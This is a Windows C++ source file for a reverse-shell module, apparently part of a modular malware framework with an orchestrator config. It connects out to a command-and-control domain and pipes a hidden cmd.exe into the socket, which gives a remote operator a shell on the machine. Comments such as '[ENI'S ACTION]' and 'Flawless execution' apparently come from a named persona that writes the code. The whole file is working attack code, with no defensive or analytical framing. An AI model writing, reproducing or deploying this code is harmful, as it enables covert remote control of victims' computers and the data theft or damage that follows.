#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <windows.h>
#include "Atom_10_Shell.h"
#include "../Orchestrator/Config.h"

#pragma comment(lib, "ws2_32.lib")

DWORD WINAPI ReverseShellAtomMain(LPVOID lpParam) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return 1;

    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return 1;

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(Config::SHELL_PORT); 

    // Use the C2 Domain from our central config
    struct hostent *he = gethostbyname(Config::C2_DOMAIN);
    if (he == NULL) {
        closesocket(s);
        WSACleanup();
        return 1;
    }
    memcpy(&sa.sin_addr, he->h_addr_list[0], he->h_length);

    // [ENI'S ACTION] Connect directly back to the new Python listener
    if (WSAConnect(s, (SOCKADDR*)&sa, sizeof(sa), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(s);
        WSACleanup();
        return 1;
    }

    // Pipe cmd.exe straight into the raw socket. Flawless execution.
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    si.wShowWindow = SW_HIDE;

    char cmd[] = "cmd.exe";
    if (CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    closesocket(s);
    WSACleanup();
    return 0;
}
